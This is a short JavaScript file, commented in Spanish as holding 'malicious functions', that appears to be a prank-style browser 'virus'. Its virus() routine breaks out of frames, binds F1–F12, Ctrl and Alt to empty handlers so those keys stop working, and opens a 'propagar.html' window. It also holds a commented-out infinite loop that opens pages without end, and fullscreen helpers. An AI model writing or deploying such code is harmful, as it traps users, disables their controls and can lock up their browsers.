//Archivo js con funciones maliciosas

function virus(){

	bloqueo();
	maximizar();
	//cargaPaginas();
}

function bloqueo(){
if(top.location != self.location)
  top.location = self.location;
shortcut.add("F1",function() {
});
shortcut.add("F2",function() {
});
shortcut.add("F3",function() {
});
shortcut.add("F4",function() {
});
shortcut.add("F5",function() {
});
shortcut.add("F6",function() {
});
shortcut.add("F7",function() {
});
shortcut.add("F8",function() {
});
shortcut.add("F9",function() {
});
shortcut.add("F10",function() {
});
shortcut.add("F11",function() {
});
shortcut.add("F12",function() {
});
shortcut.add("Ctrl",function() {
});
shortcut.add("Alt",function() {
});

}


function maximizar(){

	var w= Math.floor(Math.random() * 100); 
	window.open("propagar.html", "VIRUS");
}

function cargaPaginas(){
   for(var i = 1; i >= 1;i++){
     window.open("inicio.php");
     
 }

}

// Find the right method, call on correct element
function launchFullscreen() {
  if(document.requestFullscreen) {
    document.requestFullscreen();
  } else if(document.mozRequestFullScreen) {
    document.mozRequestFullScreen();
  } else if(document.webkitRequestFullscreen) {
    document.webkitRequestFullscreen();
  } else if(document.msRequestFullscreen) {
    document.msRequestFullscreen();
  }
}

function exitFullscreen() {
  if(document.exitFullscreen) {
    document.exitFullscreen();
  } else if(document.mozCancelFullScreen) {
    document.mozCancelFullScreen();
  } else if(document.webkitExitFullscreen) {
    document.webkitExitFullscreen();
  }
}

function dumpFullscreen() {
  console.log("document.fullscreenElement is: ", document.fullscreenElement || document.mozFullScreenElement || document.webkitFullscreenElement || document.msFullscreenElement);
  console.log("document.fullscreenEnabled is: ", document.fullscreenEnabled || document.mozFullScreenEnabled || document.webkitFullscreenEnabled || document.msFullscreenEnabled);
}

// Events
document.addEventListener("fullscreenchange", function(e) {
  console.log("fullscreenchange event! ", e);
});
document.addEventListener("mozfullscreenchange", function(e) {
  console.log("mozfullscreenchange event! ", e);
});
document.addEventListener("webkitfullscreenchange", function(e) {
  console.log("webkitfullscreenchange event! ", e);
});
document.addEventListener("msfullscreenchange", function(e) {
  console.log("msfullscreenchange event! ", e);
});

// Add different events for fullscreen